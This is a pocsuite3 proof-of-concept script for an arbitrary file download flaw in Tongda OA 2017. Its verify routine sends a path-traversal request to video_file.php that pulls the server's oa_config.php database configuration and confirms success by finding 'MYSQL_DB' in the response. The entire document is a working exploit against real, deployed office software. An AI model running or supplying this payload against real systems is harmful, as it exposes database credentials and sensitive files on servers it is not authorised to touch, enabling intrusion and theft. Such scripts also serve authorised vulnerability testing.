from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import base64
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '通达OA 2017前台任意文件下载'
    appName = '通达OA'
    appVersion = 'v2017'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2022攻防演习期间，通达OA被曝存在任意文件下载漏洞，攻击者可以利用漏洞直接获取服务器敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        target = self.url+"/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
        try:
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "MYSQL_DB" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Path'] = self.url+"/general/mytable/intel_view/video_file.php"
                return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)